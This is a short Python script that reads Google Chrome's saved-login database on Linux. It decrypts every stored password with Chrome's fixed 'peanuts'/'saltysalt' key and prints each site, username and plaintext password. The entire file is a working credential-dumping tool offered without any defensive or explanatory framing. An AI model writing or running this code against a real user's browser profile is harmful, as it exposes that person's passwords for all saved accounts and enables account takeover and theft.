import sqlite3
import shutil
import os
from Crypto.Cipher import AES

# Copy the database first since Chrome locks it while running
shutil.copy2(
    os.path.expanduser("~/.config/google-chrome/Default/Login Data"),
    "/tmp/LoginData"
)

conn = sqlite3.connect("/tmp/LoginData")
cursor = conn.cursor()
cursor.execute("SELECT origin_url, username_value, password_value FROM logins")

for url, username, encrypted_password in cursor.fetchall():
    # Chrome encrypts with AES-128-CBC
    # Key is derived from "peanuts" using PBKDF2
    # IV is always 16 spaces
    from hashlib import pbkdf2_hmac
    key = pbkdf2_hmac(
        'sha1',
        b'peanuts',
        b'saltysalt',
        1,
        dklen=16
    )
    iv = b' ' * 16
    # Strip the 3 byte "v10" prefix Chrome adds
    encrypted_password = encrypted_password[3:]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted = cipher.decrypt(encrypted_password)
    # Remove PKCS7 padding
    padding = decrypted[-1]
    decrypted = decrypted[:-padding]
    print(f"URL: {url}")
    print(f"Username: {username}")
    print(f"Password: {decrypted.decode('utf-8')}")

conn.close()
